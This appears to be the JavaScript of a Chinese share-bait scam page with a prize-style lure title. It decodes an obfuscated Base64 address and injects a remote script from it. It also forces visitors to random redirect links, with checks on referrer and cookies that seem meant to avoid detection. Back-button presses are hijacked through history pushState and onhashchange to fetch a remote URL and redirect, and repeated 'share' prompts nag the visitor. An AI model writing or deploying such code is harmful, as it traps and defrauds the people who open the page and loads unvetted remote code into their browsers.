

var cW, cH;
var flag;
window.frames.length != parent.frames.length ? flag = 0 : flag = 1;
cW = document.documentElement.clientWidth;
cH = document.documentElement.clientHeight;
var apiRoot = 'Ly9xYzIua21kbnMubmV0TEST';
var ejfiemw;
if (window.tbsJs != null && window.tbsJs != undefined) {
    tbsJs.onReady('{useCachedApi : "true"}', function (_0x273c79) {
    });
}

function getCookie(key) {
    var res, reg = new RegExp('(^| )' + key + '=([^;]*)(;|$)');
    if (res = document.cookie.match(reg)) {
        return unescape(res[2]);
    } else {
        return '';
    }
}

function getUrlParam(name) {
    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)');
    var ps = window.location.search.substr(1).match(reg);
    if (ps != null) return unescape(ps[2]);
    return null;
}

function setCookie(key, value) {
    var time = 30;
    var date = new Date();
    date['setTime'](date['getTime']() + time * 24 * 60 * 60 * 1000);
    document.cookie = key + '=' + escape(value) + ';expires=' + date['toGMTString']();
}

function Base64() {
    _keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    this.encode = function (str) {
        var a = ``;
        var b, c, d, e, ee, u, i;
        var p = 0;
        str = _utf8_encode(str);
        while (p < str.length) {
            b = str.charCodeAt(p++);
            c = str.charCodeAt(p++);
            d = str.charCodeAt(p++);
            e = b >> 2;
            ee = (b & 3) << 4 | c >> 4;
            u = (c & 15) << 2 | d >> 6;
            i = d & 63;
            if (isNaN(c)) {
                u = i = 64
            } else {
                if (isNaN(d)) {
                    i = 64
                }
            }
            ;a = a + _keyStr.charAt(e) + _keyStr.charAt(ee) + _keyStr.charAt(u) + _keyStr.charAt(i)
        }
        ;
        return a
    };
    this.decode = function (str) {
        var a = '';
        var b, c, d;
        var e, f, g, h;
        var i = 0;
        str = str.replace(/[^A-Za-z0-9+/=]/g, ``);
        while (i < str.length) {
            e = _keyStr.indexOf(str.charAt(i++));
            f = _keyStr.indexOf(str.charAt(i++));
            g = _keyStr.indexOf(str.charAt(i++));
            h = _keyStr.indexOf(str.charAt(i++));
            b = e << 2 | f >> 4;
            c = (f & 15) << 4 | g >> 2;
            d = (g & 3) << 6 | h;
            a = a + String.fromCharCode(b);
            if (g != 64) {
                a = a + String.fromCharCode(c)
            }
            ;
            if (h != 64) {
                a = a + String.fromCharCode(d)
            }
        }
        ;a = _utf8_decode(a);
        return a
    };
    _utf8_encode =  function (str) {
        str = str.replace(/\r\n/g, '\x0a');
        var res = '';
        for (var i = 0; i < str.length; i++) {
            var c = str.charCodeAt(i);
            if (c < 128) {
                res += String.fromCharCode(c)
            } else {
                if (c > 127 && c < 2048) {
                    res += String.fromCharCode(c >> 6 | 192);
                    res += String.fromCharCode(c & 63 | 128)
                } else {
                    res += String.fromCharCode(c >> 12 | 224);
                    res += String.fromCharCode(c >> 6 & 63 | 128);
                    res += String.fromCharCode(c & 63 | 128)
                }
            }
        }
        ;
        return res
    };
    _utf8_decode = function (str) {
        var res = '';
        var i = 0;
        var n = c1 = c2 = 0;
        while (i < str.length) {
            n = str.charCodeAt(i);
            if (n < 128) {
                res += String.fromCharCode(n);
                i++
            } else {
                if (n > 191 && n < 224) {
                    c2 = str.charCodeAt(i + 1);
                    res += String.fromCharCode((n & 31) << 6 | c2 & 63);
                    i += 2
                } else {
                    c2 = str.charCodeAt(i + 1);
                    c3 = str.charCodeAt(i + 2);
                    res += String.fromCharCode((n & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                    i += 3
                }
            }
        }
        return res
    }
}




window.base64 = new Base64();
function isEjfiemw() {
    if (Math.random() > 100) {
        return true;
    }
    var i = 0;
    for (; i < ejfiemw.length; i++) {
        if (ejfiemw[i].indexOf(top.location.host.substring(top.location.host.indexOf(".") + 1)) != -1) {
            return true;
        }
    }
    return false;
}
function isAevkhi3() {
    if (Math.random() > 100) {
        return true;
    }
    if ("" == document.referrer) {
        return true;
    }
    return false;
}
function loadAPIJS(callback) {
    var dest = apiRoot;
    var filesToCopy;
    var self;
    filesToCopy = document.createElement("script");
    filesToCopy.src = dest;
    self = document.getElementsByTagName("script")[0];
    self.parentNode.insertBefore(filesToCopy, self);
	
}
function loadCommonJS(emb) {
    var dest = emb;
    var filesToCopy;
    var self;
    filesToCopy = document.createElement("script");
    filesToCopy.src = dest;
    self = document.getElementsByTagName("script")[0];
    self.parentNode.insertBefore(filesToCopy, self);
}
function show(wordVal, str, text) {
    var factory = document.getElementById("sdk_dialog");
    var tagNameSpecificConfig = document.getElementById("sdk_dialog_hd");
    var third_party = document.getElementById("sdk_dialog_bd");
    var element = document.getElementById("sdk_dialog_ft");
    factory.style.display = "block";
    tagNameSpecificConfig.innerHTML = wordVal;
    third_party.innerHTML = str;
    element.innerHTML = text;
    element.removeEventListener("click", function() {
    }, false);
    element.addEventListener("click", function() {
        factory.style.display = "none";
    }, false);
}

apiRoot = base64["decode"](apiRoot.replace("TEST", "L2hi").replace("TEST", "L2hi"));


window.jsCallback = function(emb, jaws) {
    if (emb == "ejfiemw") {
        ejfiemw = jaws.data;
    } else {
        if (emb == "cejsje") {
            window.adLink = jaws.adLink;
        } else {
            if (emb = "eugjrrh") {
                if ("1" != getCookie("isClick")) {
                    if (isEjfiemw()) {
                        if (isAevkhi3()) {
                            if ("1" != getCookie("isClick")) {
                           
                                var rels = ejfiemw;
                                var rel = rels[Math.floor(Math.random() * rels.length)];
                                var height = getUrlParam("jpx");
                                if (height == undefined || height == null) {
                                    height = 20;
                                } else {
                                    height = parseInt(height);
                                }
                                if (parseInt(Math.random() * 100) > height) {
                                    if (flag == 0) {
                                        top.location.href = rel;
                                    } else {
                                        document.location.href = rel;
                                    }
                                    return false;
                                }
                            }
                        }
                    } else {

                        rels = ejfiemw;
                        rel = rels[Math.floor(Math.random() * rels.length)];
                        height = getUrlParam("jpx");
                        if (height == undefined || height == null) {
                            height = 20;
                        } else {
                            height = parseInt(height);
                        }
                        if (parseInt(Math.random() * 100) > height) {
                            if (flag == 0) {
                                top.location.href = rel;
                            } else {
                                document.location.href = rel;
                            }
                            return false;
                        }
                    }                  
                }
            }
        }
    }
};
window.goAd = function() {
    if (adLink != null) {
        var array = new Array;
        var i = 0;
        for (; i < adLink.length; i++) {
            if (adLink[i] != null && adLink[i].indexOf("canGo") != -1) {
                array.push(adLink[i]);
            }
        }
        if (array.length == 0) {
            return false;
        }
        var rel = array[Math.floor(Math.random() * array.length)];
        if (flag == 0) {
            top.location.href = rel;
        } else {
            document.location.href = rel;
        }
    }
};
function modifyLocationHref(emb) {
    var arr = new Array;
    var i = 0;
    for (; i < adLink.length; i++) {
        arr.push(adLink[i]);
    }
    if (arr.length == 0) {
        return false;
    }
    var rel = arr[Math.floor(Math.random() * arr.length)];
    if (flag == 0) {
        top.location.href = rel;
    } else {
        document.location.href = rel;
    }
}
function clickArea() {
    document.getElementById("img-map").addEventListener("click", redirectToCash, false);
}

function hashChangeJump() {
    if (Math.random() > 0.1) {
        document.location.href = androidLink + "?ad=" + (parseInt((parseInt((new Date).getTime() / (1E3 * 60 * 1)) + "").substring(2)) + 5E3);
    }
}

function zp(){
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET', 'https://s10.app1110258507.qqopenapp.com/160/ad', true);
    httpRequest.send();
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            var json = httpRequest.responseText;
            window.location.href=json;
        }
    };
}
var f=0;
document.title=randomChoose('💘', '❤', '💓', '💔', '💕', '💖', '💗', '💙', '💚', '💛', '💜', '💝', '👌', '🔥', '😉', '😛', '😜', '😔', '㊙', '💘', '💖', '🔥', '😋', '😱')+'07月10日截止-人人有份'+randomChoose('💘', '❤', '💓', '💔', '💕', '💖', '💗', '💙', '💚', '💛', '💜', '💝', '👌', '🔥', '😉', '😛', '😜', '😔', '㊙', '💘', '💖', '🔥', '😋', '😱')+'！！！·········>>>';
function share_tip(){
    f++;
    // document.title=title[f];
    if(f==1){
        document['getElementById'](_0x444e('0x4d'))[_0x444e('0x0')][_0x444e('0x42')]='block';
        document['getElementById']('squan')[_0x444e('0x0')][_0x444e('0x42')]='none';
    }
    if(f.toString()!=window.wxData.shareNum){
        wxalert(unescape(window.wxData.hint[f]),'确定');
    }else{
        wxalert(unescape(window.wxData.hint[f]),'确定',zp);
    }

}
function hiddenFunc() {
    window.hiddenProperty = "hidden" in document ? "hidden" : "webkitHidden" in document ? "webkitHidden" : "mozHidden" in document ? "mozHidden" : null;
    window.visibilityChangeEvent = window.hiddenProperty.replace(/hidden/i, "visibilitychange");
    window.onVisibilityChange = function () {
        if (!document[window.hiddenProperty]) {
            share_tip();
        }
    };
    document.addEventListener(window.visibilityChangeEvent, window.onVisibilityChange)
}
hiddenFunc(); 
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?fd9a5ee01574c44576b0574c09baafaf";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
setTimeout(function () {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}, 200);
window.onhashchange = function () {
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET', 'https://s10.app1110258507.qqopenapp.com/160/ad/z', true);
    httpRequest.send();
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            var json = httpRequest.responseText;
            window.location.href=json;
        }
    };
};